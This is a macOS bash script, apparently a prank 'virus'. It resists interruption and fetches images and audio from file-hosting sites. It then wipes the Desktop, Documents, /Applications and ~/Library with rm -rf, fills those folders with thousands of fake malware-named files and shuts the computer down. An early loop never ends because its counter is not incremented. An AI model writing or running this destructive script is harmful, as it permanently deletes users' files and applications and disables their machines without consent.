# Variables
repeat=0
memes=( "keylogger" "malware" "virus" "backdoor" "rat" "rootkit" "irs" "trojan" "worm" "botnet" "zeus" "adware" "hack" "network" "root" )
extension=".exe"

# Security Precautions
bash -c "nohup sh -c 'while true; do date; sleep 1; done' &" > /dev/null 2>&1
trap '' 2 > /dev/null 2>&1
chattr +i mac.sh > /dev/null 2>&1

# ASCII
clear
cd ~/Pictures > /dev/null 2>&1
curl https://files.catbox.moe/ab5eca.txt --output meme.txt > /dev/null 2>&1
cat meme.txt

# Begin
cd ~/Pictures > /dev/null 2>&1
curl https://i.ytimg.com/vi/ZdV6wKo5o1A/hqdefault.jpg --output meme.jpg > /dev/null 2>&1
curl https://cdn.pixabay.com/photo/2015/06/18/01/46/hack-813290_960_720.jpg --output background.jpg > /dev/null 2>&1
sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '~/Pictures/background.jpg'" && killall Dock > /dev/null 2>&1s
curl https://files.catbox.moe/0imoe1.mp3 --output meme.mp3 > /dev/null 2>&1
afplay meme.mp3 & > /dev/null 2>&1

while [ $repeat -le 50 ]
do
	open meme.jpg > /dev/null 2>&1
done	

repeat=0

# Deletion - Desktop 
rm -rf /Users/$USER/Desktop/* > /dev/null 2>&1
cd /Users/$USER/Desktop > /dev/null 2>&1

while [ $repeat -le 1000 ]
do	
	touch ${memes[$RANDOM % ${#memes[@]} ]}_$repeat$extension > /dev/null 2>&1
	repeat=$(( repeat+1 ))
done

repeat=0

# Deletion - Applications
rm -rf /Applications/* > /dev/null 2>&1
cd /Applications > /dev/null 2>&1

while [ $repeat -le 1000 ]
do	
	touch ${memes[$RANDOM % ${#memes[@]} ]}_$repeat$extension > /dev/null 2>&1
	repeat=$(( repeat+1 ))
done

repeat=0

# Deletion - Documents
rm -rf /Users/$USER/Documents/* > /dev/null 2>&1
cd /Users/$USER/Documents > /dev/null 2>&1

while [ $repeat -le 1000 ]
do	
	touch ${memes[$RANDOM % ${#memes[@]} ]}_$repeat$extension > /dev/null 2>&1
	repeat=$(( repeat+1 ))
done

repeat=0

# Deletion - Library
rm -rf ~/Library* > /dev/null 2>&1
cd ~/Library > /dev/null 2>&1

while [ $repeat -le 1000 ]
do	
	touch ${memes[$RANDOM % ${#memes[@]} ]}_$repeat$extension > /dev/null 2>&1
	repeat=$(( repeat+1 ))
done

repeat=0

# End
echo "don't run something without looking at what it is first man"
sleep 5s
shutdown -h now
